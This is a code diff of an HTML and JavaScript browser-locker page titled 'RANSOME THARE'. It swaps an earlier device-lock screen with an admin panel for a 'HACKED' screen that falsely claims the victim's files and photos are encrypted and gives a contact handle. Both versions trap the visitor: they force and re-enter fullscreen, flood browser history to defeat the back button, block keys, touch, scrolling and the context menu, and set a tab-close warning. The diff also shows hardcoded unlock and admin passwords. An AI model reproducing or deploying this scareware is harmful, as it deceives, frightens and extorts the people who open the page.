@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
-    <title>RANSOME THARE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>HACKED - RANSOME THARE</title>
     <style>
         * {
             margin: 0;
@@ -11,59 +11,42 @@
             box-sizing: border-box;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
-            -webkit-touch-callout: none;
-        }
-
-        /* COMPLETE OVERLAY - NOTHING CAN ESCAPE */
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
         }
 
         body {
+            background: linear-gradient(135deg, #0a0a0a, #1a0000);
+            min-height: 100vh;
+            color: #ff3333;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
             font-family: 'Courier New', monospace;
-            background: #4a2c0a;
-            color: #d4a373;
-            touch-action: none;
-            -webkit-overflow-scrolling: none;
-            overscroll-behavior: none;
         }
 
-        /* LOCK SCREEN - COMPLETE FREEZE */
+        /* LOCK SCREEN */
         .lock-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: #4a2c0a;
+            background: linear-gradient(135deg, #0a0a0a, #1a0000);
             z-index: 99999;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             text-align: center;
-            padding: 25px;
-            pointer-events: auto;
+            padding: 20px;
         }
 
-        /* Disable all interactions on lock screen except settings button */
-        .lock-screen * {
-            pointer-events: none;
-        }
-
+        /* Skull Animation */
         .skull {
             font-size: 100px;
             margin-bottom: 20px;
-            filter: drop-shadow(0 0 15px #ff6600);
-            animation: shake 0.5s infinite;
-            pointer-events: none !important;
+            filter: drop-shadow(0 0 20px red);
+            animation: shake 0.5s infinite, glow 1s infinite;
         }
 
         @keyframes shake {
@@ -72,165 +55,111 @@
             75% { transform: translateX(3px); }
         }
 
-        h1 {
-            font-size: 28px;
-            margin-bottom: 8px;
-            color: #ff6600;
-            letter-spacing: 2px;
-            pointer-events: none;
+        @keyframes glow {
+            0%,100% { filter: drop-shadow(0 0 10px red); }
+            50% { filter: drop-shadow(0 0 25px #ff0000); }
         }
 
-        .sub {
-            opacity: 0.7;
-            margin-bottom: 30px;
-            font-size: 12px;
-            pointer-events: none;
-        }
-
-        .message-box {
-            background: rgba(0,0,0,0.3);
-            padding: 20px;
-            border-radius: 15px;
-            width: 85%;
-            border: 1px solid #ff6600;
-            pointer-events: none;
-        }
-
-        .label {
-            font-size: 11px;
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-            color: #ffaa66;
-            pointer-events: none;
-        }
-
-        .device-id {
-            font-size: 18px;
+        /* HACKED TEXT */
+        .hacked-title {
+            font-size: 48px;
             font-weight: bold;
-            font-family: monospace;
+            color: #ff0000;
+            letter-spacing: 5px;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px red;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .sub-text {
+            font-size: 18px;
+            color: #ff6666;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+
+        /* Message Box */
+        .message-box {
+            background: rgba(0,0,0,0.6);
+            border: 2px solid #ff0000;
+            border-radius: 20px;
+            padding: 20px;
+            width: 85%;
+            margin-bottom: 30px;
+        }
+
+        .warning-text {
+            font-size: 14px;
+            color: #ff8888;
+            line-height: 1.5;
+        }
+
+        .highlight {
+            color: #ff0000;
+            font-weight: bold;
+        }
+
+        /* Device ID */
+        .device-id-box {
             background: rgba(0,0,0,0.5);
             padding: 10px;
             border-radius: 10px;
-            letter-spacing: 1px;
-            pointer-events: none;
+            margin-top: 10px;
         }
 
-        /* SETTINGS BUTTON - ONLY WORKING THING */
-        .settings-btn {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #2e7d32;
+        .device-id-label {
+            font-size: 11px;
+            color: #ff8888;
+        }
+
+        .device-id-value {
+            font-size: 16px;
+            font-weight: bold;
+            font-family: monospace;
+            color: #ff6666;
+        }
+
+        /* UNLOCK BUTTON */
+        .unlock-btn {
+            background: linear-gradient(135deg, #ff0000, #990000);
             color: white;
             border: none;
             border-radius: 50px;
-            padding: 14px 30px;
-            font-size: 16px;
+            padding: 18px 40px;
+            font-size: 24px;
             font-weight: bold;
             cursor: pointer;
-            z-index: 100000;
-            box-shadow: 0 0 15px #4caf50;
-            transition: 0.1s;
+            margin: 20px 0;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+            transition: 0.2s;
             letter-spacing: 2px;
-            pointer-events: auto !important;
         }
 
-        .settings-btn:active {
-            transform: translateX(-50%) scale(0.97);
+        .unlock-btn:active {
+            transform: scale(0.96);
         }
 
-        /* ADMIN PANEL - Hidden by default */
-        .admin-panel {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #1a1a2e;
-            z-index: 200000;
-            padding: 20px;
-            overflow-y: auto;
-            flex-direction: column;
+        /* Footer Text */
+        .footer-text {
+            position: absolute;
+            bottom: 20px;
+            font-size: 11px;
+            color: #ff6666;
+            opacity: 0.6;
+            text-align: center;
         }
 
-        .admin-header {
-            background: #2a2a3e;
-            padding: 15px;
-            border-radius: 15px;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+        .footer-text a {
+            color: #ff6666;
+            text-decoration: none;
         }
 
-        .admin-header h2 {
-            color: #ff9800;
-            font-size: 18px;
-        }
-
-        .close-admin {
-            background: #f44336;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 10px;
-            color: white;
-            cursor: pointer;
-        }
-
-        .device-list {
-            background: #2a2a3e;
-            border-radius: 15px;
-            padding: 15px;
-            max-height: 400px;
-            overflow-y: auto;
-        }
-
-        .device-item {
-            background: #3a3a4e;
-            padding: 12px;
-            margin: 8px 0;
-            border-radius: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .device-item button {
-            background: #ff9800;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-
-        .add-device {
-            margin-top: 15px;
-            display: flex;
-            gap: 10px;
-        }
-
-        .add-device input {
-            flex: 1;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            background: #3a3a4e;
-            color: white;
-        }
-
-        .add-device button {
-            padding: 12px 20px;
-            background: #4caf50;
-            border: none;
-            border-radius: 10px;
-            color: white;
-            cursor: pointer;
-        }
-
-        /* PASSWORD MODALS */
+        /* Password Modal */
         .password-modal {
             display: none;
             position: fixed;
@@ -239,51 +168,54 @@
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.98);
-            z-index: 300000;
+            z-index: 200000;
             justify-content: center;
             align-items: center;
         }
 
         .password-box {
-            background: #2a2a2a;
-            border-radius: 20px;
-            padding: 30px;
+            background: #1a1a1a;
+            border-radius: 25px;
+            padding: 35px;
             width: 90%;
-            max-width: 320px;
+            max-width: 350px;
             text-align: center;
-            border: 2px solid #ff9800;
+            border: 2px solid #ff0000;
         }
 
         .password-box h3 {
-            color: #ff9800;
+            color: #ff0000;
             margin-bottom: 20px;
+            font-size: 24px;
         }
 
         .password-box input {
             width: 100%;
-            padding: 12px;
+            padding: 15px;
             border: none;
-            border-radius: 10px;
-            font-size: 16px;
+            border-radius: 50px;
+            font-size: 20px;
             text-align: center;
             background: white;
+            letter-spacing: 3px;
         }
 
         .password-box button {
             width: 100%;
-            padding: 12px;
-            margin-top: 15px;
-            background: #4caf50;
+            padding: 15px;
+            margin-top: 20px;
+            background: #ff0000;
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 50px;
+            font-size: 18px;
             cursor: pointer;
             font-weight: bold;
         }
 
         .pass-error {
             color: #ff5555;
-            margin-top: 10px;
+            margin-top: 12px;
             display: none;
         }
 
@@ -294,297 +226,172 @@
             transform: translate(-50%, -50%);
             background: #4caf50;
             color: white;
-            padding: 12px 25px;
-            border-radius: 30px;
-            font-size: 16px;
-            z-index: 400000;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            z-index: 300000;
             display: none;
             white-space: nowrap;
-        }
-
-        /* Block any possible overlays */
-        iframe, object, embed {
-            display: none !important;
         }
     </style>
 </head>
 <body>
 
-    <!-- LOCK SCREEN - COMPLETELY FROZEN -->
+    <!-- LOCK SCREEN -->
     <div id="lockScreen" class="lock-screen">
         <div class="skull">💀</div>
-        <h1>🔒 DEVICE LOCKED</h1>
-        <div class="sub">Your device has been remotely locked</div>
+        <div class="hacked-title">HACKED</div>
+        <div class="sub-text">Already Hacked Your Phone</div>
+        
         <div class="message-box">
-            <div class="label">🔐 DEVICE ID</div>
-            <div class="device-id" id="deviceIdDisplay">----</div>
-        </div>
-        <div class="sub" style="margin-top: 20px;">⚠️ Contact administrator</div>
-    </div>
-
-    <!-- SETTINGS BUTTON - ONLY WORKING ELEMENT -->
-    <button class="settings-btn" id="settingsBtn">⚙️ SETTINGS</button>
-
-    <!-- ADMIN PANEL -->
-    <div id="adminPanel" class="admin-panel">
-        <div class="admin-header">
-            <h2>👑 ADMIN PANEL - RANSOME THARE</h2>
-            <button class="close-admin" onclick="closeAdminPanel()">✖ CLOSE</button>
-        </div>
-        <div class="device-list">
-            <h3 style="margin-bottom: 10px; color:#ff9800;">📱 LOCKED DEVICES</h3>
-            <div id="deviceListContainer">
-                <p style="text-align:center;opacity:0.7;">Loading...</p>
+            <div class="warning-text">
+                🔒 <span class="highlight">YOUR PHONE HAS BEEN LOCKED</span> 🔒<br><br>
+                All your files, photos, and data have been encrypted.<br><br>
+                To unlock your device, you need to enter the correct password.<br><br>
+                <span class="highlight">DO NOT CLOSE THIS SCREEN</span><br>
+                If you close it, your data may be lost forever.
             </div>
-            <div class="add-device">
-                <input type="text" id="newDeviceId" placeholder="New Device ID (or auto)">
-                <button onclick="addNewDevice()">➕ ADD</button>
+            <div class="device-id-box">
+                <div class="device-id-label">🔐 DEVICE ID</div>
+                <div class="device-id-value" id="deviceId">----</div>
             </div>
         </div>
-    </div>
 
-    <!-- SETTINGS PASSWORD MODAL -->
-    <div id="settingsPasswordModal" class="password-modal">
-        <div class="password-box">
-            <h3>🔐 ADMIN PASSWORD</h3>
-            <input type="password" id="settingsPass" placeholder="Enter password" autocomplete="off">
-            <button onclick="verifySettingsPassword()">LOGIN</button>
-            <div id="settingsPassError" class="pass-error">❌ Wrong password!</div>
+        <button class="unlock-btn" id="unlockBtn">🔓 UNLOCK DEVICES</button>
+        
+        <div class="footer-text">
+            ⚠️ Contact: @Anonymousploit01 | RANSOME THARE
         </div>
     </div>
 
-    <!-- EXIT PASSWORD MODAL -->
-    <div id="exitPasswordModal" class="password-modal">
+    <!-- PASSWORD MODAL -->
+    <div id="passwordModal" class="password-modal">
         <div class="password-box">
-            <h3>🔐 ENTER PASSWORD TO EXIT</h3>
-            <input type="password" id="exitPass" placeholder="Enter password" autocomplete="off">
-            <button onclick="verifyExitPassword()">UNLOCK & EXIT</button>
-            <div id="exitPassError" class="pass-error">❌ Wrong password!</div>
+            <h3>🔐 ENTER UNLOCK PASSWORD</h3>
+            <input type="password" id="unlockPassword" maxlength="6" placeholder="******" autocomplete="off">
+            <button onclick="verifyPassword()">UNLOCK NOW</button>
+            <div id="passError" class="pass-error">❌ Wrong password! Try again.</div>
         </div>
     </div>
 
     <!-- SUCCESS TOAST -->
-    <div id="successToast" class="success-toast">✅ UNLOCKED! Exiting...</div>
+    <div id="successToast" class="success-toast">✅ UNLOCKED! Device will exit now.</div>
 
     <script>
-        // ========== PASSWORDS ==========
-        const ADMIN_SETTINGS_PASSWORD = "satvir0001";
-        const EXIT_PASSWORD = "809080";
+        // ========== PASSWORD ==========
+        const UNLOCK_PASSWORD = "123456";
         
-        // ========== DATA ==========
-        let lockedDevices = JSON.parse(localStorage.getItem('ransome_locked_devices') || '[]');
-        let currentDeviceId = localStorage.getItem('ransome_current_device') || null;
-
         // ========== GENERATE DEVICE ID ==========
         function generateDeviceId() {
-            return 'DEV-' + Math.floor(10000 + Math.random() * 90000).toString();
+            return 'THARE-' + Math.floor(10000 + Math.random() * 90000).toString();
         }
 
-        // ========== SAVE & UPDATE ==========
-        function saveDevices() {
-            localStorage.setItem('ransome_locked_devices', JSON.stringify(lockedDevices));
-            updateDeviceList();
+        // Get or create device ID
+        let deviceId = localStorage.getItem('ransome_device_id');
+        if (!deviceId) {
+            deviceId = generateDeviceId();
+            localStorage.setItem('ransome_device_id', deviceId);
         }
+        document.getElementById('deviceId').innerText = deviceId;
 
-        function updateDeviceList() {
-            const container = document.getElementById('deviceListContainer');
-            if (!container) return;
-            
-            if (lockedDevices.length === 0) {
-                container.innerHTML = '<p style="text-align:center;opacity:0.7;">No locked devices</p>';
-            } else {
-                container.innerHTML = '';
-                lockedDevices.forEach(device => {
-                    const div = document.createElement('div');
-                    div.className = 'device-item';
-                    div.innerHTML = `
-                        <span>🔒 ${device.id}</span>
-                        <button onclick="forceUnlock('${device.id}')">🔓 FORCE UNLOCK</button>
-                    `;
-                    container.appendChild(div);
-                });
-            }
-        }
-
-        function addNewDevice() {
-            let id = document.getElementById('newDeviceId').value.trim();
-            if (!id) {
-                id = generateDeviceId();
-            }
-            if (id.length < 4) {
-                alert('ID too short!');
-                return;
-            }
-            if (lockedDevices.find(d => d.id === id)) {
-                alert('Device already exists!');
-                return;
-            }
-            lockedDevices.push({ id: id, lockedAt: new Date().toISOString() });
-            saveDevices();
-            alert(`✅ Device ${id} added!`);
-            document.getElementById('newDeviceId').value = '';
-        }
-
-        function forceUnlock(deviceId) {
-            if (confirm(`Force unlock ${deviceId}?`)) {
-                lockedDevices = lockedDevices.filter(d => d.id !== deviceId);
-                saveDevices();
-                alert(`✅ Device ${deviceId} unlocked!`);
-                if (currentDeviceId === deviceId) {
-                    exitBrowser();
-                }
-            }
-        }
-
-        // ========== FULLSCREEN - HIDE URL BAR ==========
+        // ========== FULLSCREEN MODE ==========
         function enterFullscreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
             else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
             else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-            
-            // Extra: Try to hide address bar on mobile
-            window.scrollTo(0, 1);
         }
 
-        // Force stay in fullscreen
+        // Re-enter fullscreen if exited
         document.addEventListener('fullscreenchange', function() {
-            if (currentDeviceId && !document.fullscreenElement && !document.webkitFullscreenElement) {
-                setTimeout(() => enterFullscreen(), 50);
+            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                setTimeout(() => enterFullscreen(), 100);
             }
         });
         document.addEventListener('webkitfullscreenchange', function() {
-            if (currentDeviceId && !document.fullscreenElement && !document.webkitFullscreenElement) {
-                setTimeout(() => enterFullscreen(), 50);
+            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                setTimeout(() => enterFullscreen(), 100);
             }
         });
 
-        // ========== COMPLETE BLOCK - NOTHING WORKS ==========
-        function blockEverything() {
+        // ========== BLOCK ALL EXITS ==========
+        function blockAllExits() {
             // Block back button
-            for(let i = 0; i < 50; i++) {
+            for(let i = 0; i < 30; i++) {
                 window.history.pushState(null, '', window.location.href);
             }
             
             window.addEventListener('popstate', function(e) {
-                if (currentDeviceId) {
-                    for(let i = 0; i < 50; i++) {
-                        window.history.pushState(null, '', window.location.href);
-                    }
-                    showExitPasswordPrompt();
+                for(let i = 0; i < 30; i++) {
+                    window.history.pushState(null, '', window.location.href);
                 }
             });
 
-            // Block tab close
+            // Block tab close warning
             window.addEventListener('beforeunload', function(e) {
-                if (currentDeviceId) {
-                    e.preventDefault();
-                    e.returnValue = '🔒 DEVICE LOCKED! Enter password to exit.';
-                    return '🔒 DEVICE LOCKED! Enter password to exit.';
-                }
+                e.preventDefault();
+                e.returnValue = '🔒 DEVICE LOCKED! Enter password to unlock.';
+                return '🔒 DEVICE LOCKED! Enter password to unlock.';
             });
 
-            // Block ALL keyboard keys
+            // Block all keyboard keys
             document.addEventListener('keydown', function(e) {
-                if (currentDeviceId) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    showExitPasswordPrompt();
-                    return false;
-                }
+                e.preventDefault();
+                return false;
             });
 
-            // Block ALL touch/mouse events on lock screen
+            // Block all touch events on lock screen (except unlock button)
             const lockScreen = document.getElementById('lockScreen');
-            if (lockScreen) {
-                lockScreen.addEventListener('touchstart', function(e) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                });
-                lockScreen.addEventListener('touchmove', function(e) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                });
-                lockScreen.addEventListener('touchend', function(e) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                });
-                lockScreen.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                });
-            }
-
-            // Block all touch events on document
-            document.addEventListener('touchstart', function(e) {
-                if (currentDeviceId && e.target.id !== 'settingsBtn' && !e.target.closest('.settings-btn')) {
-                    e.preventDefault();
-                    showExitPasswordPrompt();
-                }
-            });
-            document.addEventListener('touchmove', function(e) {
-                if (currentDeviceId) {
+            lockScreen.addEventListener('touchstart', function(e) {
+                if (e.target.id !== 'unlockBtn' && !e.target.classList.contains('unlock-btn')) {
                     e.preventDefault();
                 }
             });
-            document.addEventListener('touchend', function(e) {
-                if (currentDeviceId && e.target.id !== 'settingsBtn' && !e.target.closest('.settings-btn')) {
-                    e.preventDefault();
-                }
+            lockScreen.addEventListener('touchmove', function(e) {
+                e.preventDefault();
             });
 
             // Block context menu
             document.addEventListener('contextmenu', function(e) {
-                if (currentDeviceId) {
-                    e.preventDefault();
-                    return false;
-                }
+                e.preventDefault();
+                return false;
             });
 
             // Block wheel/scroll
             document.addEventListener('wheel', function(e) {
-                if (currentDeviceId) {
-                    e.preventDefault();
-                }
+                e.preventDefault();
             }, { passive: false });
-
-            // Block gesture events
-            document.addEventListener('gesturestart', function(e) {
-                if (currentDeviceId) e.preventDefault();
-            });
-            document.addEventListener('gesturechange', function(e) {
-                if (currentDeviceId) e.preventDefault();
-            });
-            document.addEventListener('gestureend', function(e) {
-                if (currentDeviceId) e.preventDefault();
-            });
         }
 
-        // ========== EXIT PASSWORD ==========
-        function showExitPasswordPrompt() {
-            if (currentDeviceId) {
-                document.getElementById('exitPasswordModal').style.display = 'flex';
-                document.getElementById('exitPass').value = '';
-                document.getElementById('exitPassError').style.display = 'none';
-            }
+        // ========== SHOW PASSWORD MODAL ==========
+        function showPasswordModal() {
+            document.getElementById('passwordModal').style.display = 'flex';
+            document.getElementById('unlockPassword').value = '';
+            document.getElementById('passError').style.display = 'none';
         }
 
-        function verifyExitPassword() {
-            const pass = document.getElementById('exitPass').value;
-            if (pass === EXIT_PASSWORD) {
-                document.getElementById('exitPasswordModal').style.display = 'none';
+        function closePasswordModal() {
+            document.getElementById('passwordModal').style.display = 'none';
+        }
+
+        function verifyPassword() {
+            const pass = document.getElementById('unlockPassword').value;
+            if (pass === UNLOCK_PASSWORD) {
+                closePasswordModal();
                 const toast = document.getElementById('successToast');
                 toast.style.display = 'block';
                 setTimeout(() => {
                     toast.style.display = 'none';
                     exitBrowser();
-                }, 1000);
+                }, 1500);
             } else {
-                document.getElementById('exitPassError').style.display = 'block';
+                document.getElementById('passError').style.display = 'block';
+                // Shake effect on error
+                const box = document.querySelector('.password-box');
+                box.style.animation = 'shake 0.3s';
+                setTimeout(() => {
+                    box.style.animation = '';
+                }, 300);
             }
         }
 
@@ -595,70 +402,19 @@
             }, 500);
         }
 
-        // ========== SETTINGS (ADMIN) ==========
-        function showSettingsPassword() {
-            document.getElementById('settingsPasswordModal').style.display = 'flex';
-            document.getElementById('settingsPass').value = '';
-            document.getElementById('settingsPassError').style.display = 'none';
-        }
-
-        function verifySettingsPassword() {
-            const pass = document.getElementById('settingsPass').value;
-            if (pass === ADMIN_SETTINGS_PASSWORD) {
-                document.getElementById('settingsPasswordModal').style.display = 'none';
-                showAdminPanel();
-            } else {
-                document.getElementById('settingsPassError').style.display = 'block';
-            }
-        }
-
-        function showAdminPanel() {
-            document.getElementById('adminPanel').style.display = 'flex';
-            updateDeviceList();
-        }
-
-        function closeAdminPanel() {
-            document.getElementById('adminPanel').style.display = 'none';
-        }
-
         // ========== INIT ==========
         function init() {
-            const urlParams = new URLSearchParams(window.location.search);
-            let deviceId = urlParams.get('id');
+            enterFullscreen();
+            blockAllExits();
             
-            if (!deviceId) {
-                deviceId = generateDeviceId();
-                if (!lockedDevices.find(d => d.id === deviceId)) {
-                    lockedDevices.push({ id: deviceId, lockedAt: new Date().toISOString() });
-                    saveDevices();
-                }
-                window.location.href = `?id=${encodeURIComponent(deviceId)}`;
-                return;
-            }
-            
-            const isLocked = lockedDevices.find(d => d.id === deviceId);
-            if (isLocked) {
-                currentDeviceId = deviceId;
-                localStorage.setItem('ransome_current_device', deviceId);
-                document.getElementById('deviceIdDisplay').innerText = deviceId;
-                document.getElementById('lockScreen').style.display = 'flex';
-                
-                setTimeout(() => enterFullscreen(), 200);
-                blockEverything();
-                
-                // Continuously push history
-                setInterval(() => {
-                    if (currentDeviceId) {
-                        window.history.pushState(null, '', window.location.href);
-                    }
-                }, 200);
-            } else {
-                showAdminPanel();
-            }
+            // Push history continuously
+            setInterval(() => {
+                window.history.pushState(null, '', window.location.href);
+            }, 300);
         }
 
-        // Attach settings button
-        document.getElementById('settingsBtn').addEventListener('click', showSettingsPassword);
+        // Unlock button click
+        document.getElementById('unlockBtn').addEventListener('click', showPasswordModal);
 
         init();
     </script>
